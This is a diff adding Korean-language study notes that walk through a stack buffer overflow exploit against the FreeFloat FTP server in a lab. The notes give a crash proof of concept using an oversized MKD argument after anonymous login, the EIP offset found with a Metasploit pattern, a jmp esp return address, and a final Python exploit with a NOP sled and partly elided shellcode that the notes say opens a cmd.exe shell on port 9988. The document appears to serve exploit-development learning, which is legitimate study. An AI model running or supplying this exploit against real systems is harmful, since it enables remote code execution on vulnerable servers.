@@ -486,5 +486,84 @@ int main(int argc, char* argv[]){
     ```
 ### 실전
 ---
+- FreeFloat FTP : 사용자가 로그인에 성공한 이후 특정 명령어에 인작밧을 받을 때 길이를 확인하지X
 #### 크래시 발생시키기
+- 메모리 오염 공격
+    1. 프로그램이 실행중에 죽는 현상을 재현하는 POC(proof of concept) 코드 작성하기
+        - POC코드를 점진적으로 계속 정제해 더욱 정교한 공격 코드를 만들 수 있다.
+    - free float FTP를 대상으로 공격을 해보자. 먼저 ftpserver.exe 를 실행시키고 해당 주소와 포트로 서버연결을 해준다. `nc 192.168.227.1 21`
+    - 기본으로 생성되는 anoymous 계정에 로그인을 해준다.
+    - 버퍼 오버플로우를 발생시키는 공격 코드를 전송한다
+    ```py
+    import socket
+    import sys
+
+    evil = 'A' * 1000
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('192.168.227.1', 21))
+
+    s.recv(1024)
+    s.send('USER anonymous\r\n'.encode())
+    s.recv(1024)
+    s.send('PASS anonymous\r\n'.encode())
+    s.recv(1024)
+    s.send(('MKD ' + evil + '\r\n').encode())
+    s.recv(1024)
+    s.send('QUIT\r\n'.encode())
+    s.close()
+    ```
+    ![alt text](img/image-4.png)
+    ![alt text](img/image-1.png)
+    - 자동으로 서버가 종료되고 작업창에 있던 ftpserver 프로그램이 꺼진 것을 볼 수 있다.
+    - ollydbg 의 file > attach 로 실행중인 프로세스를 분석할 수 있다는데, 실행중인 프로세스가 나타나지않아서 공격코드로 죽은 프로세스를 디버깅 하진 못했다. ㅠㅠ
 #### EIP 덮어쓰기
+- 입력한 버퍼 중 어느 부분이 ETP로 덮어써지는지 확인하자.
+    - "A"*1000 대신 metasploit pattern을 이용해 buffer변수에 있는 내용을 다시 보낸다. (기존에 보냈던 버퍼 크기와 똑같이 보내야함)
+    1. 메타스플로잇(루비로만든 익스플로잇 코드)을 이용한 패턴 생성
+    ![alt text](img/image-2.png)
+    2. POC.py 해당 패턴으로 수정 후 실행
+        - 레지스터값이 우리가입력한 값으로 바뀌게됨.
+        - 레지스터들이 어느 위치에 해당하는 값으로 바뀌는지 쉽게 확인 가능
+    ![alt text](img/image-3.png)
+    3. 해당하는 각 위치로 evil 변수를 재구성하면
+        - `evil = "A"*247 + "B"*4 + "C"*8 + "D"*741 로 쓸 수 있다.
+        - 이 값으로 보내면 BBBB로 EIP가 덮어써지는 것을 볼 수 있음
+        - ESP가 정확히 DDDD로 시작하는 문자열을 가리킴도 볼 수 있음
+    4. 주소에 맨 처음 언급했던 "\0x00\x0a\x0d"가 없어져야함
+        - `jmp esp` 위치를 찾기 -> "\xff\xe4"
+        - ollydbg 의 memory map 창 열고 마우스 오른쪽 버튼으로 컨테스트 메뉴를 띄운 후 Search 창을 띄워 hex값으로 검색하고자 하는 값을 찾으면됨
+        - 여기서 text 영역에서 찾은 값 중 0x773f346a에있는 값을 사용
+        - 이 주소로 EIP 를 덮는 코드를 수정하자
+    5. 리틀엔디안 고려
+        - `evil = "A"*247 + "\x6a\x34\x3f\x77"*4 + "C"*8 + "D"*741`
+    6. 0x773f346a에 breakpoint 걸고 공격코드 실행
+        - EIP 가 정상적으로바뀜. 
+    7. 우리가실행하고자하는 공격코드를 DDDD에 해당하는 곳에 넣기
+        ```py
+        import socket
+        import sys
+
+        shellcode = (
+            "\xdb\xd0\xbb\x36\xcc\x70\x15\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
+            "\x56\x86\xc2\x04\x31\x5a\x14\x03\x5a\x22\x2e\x85\xe9\xa2\x27"
+            "\x66\x12\x32\x58\xee\xf7\x03\x4a\x94\x7c\x31\x5a\xde\xd1\xb9"
+            #..
+        )
+        buffer = "\x90"*20 + shellcode
+        evil = "A"*247 + "\x6a\x34\x3f\x77" + "C"*8 + buffer + "C"*(741-len(buffer))
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('192.168.227.1', 21))
+
+        s.recv(1024)
+        s.send('USER anonymous\r\n'.encode())
+        s.recv(1024)
+        s.send('PASS anonymous\r\n'.encode())
+        s.recv(1024)
+        s.send(('MKD ' + evil + '\r\n').encode())
+        s.recv(1024)
+        s.send('QUIT\r\n'.encode())
+        s.close()
+        ```
+        9988 포트에 cmd.exe를 실행하게 되는 모습을 볼 수 있다.
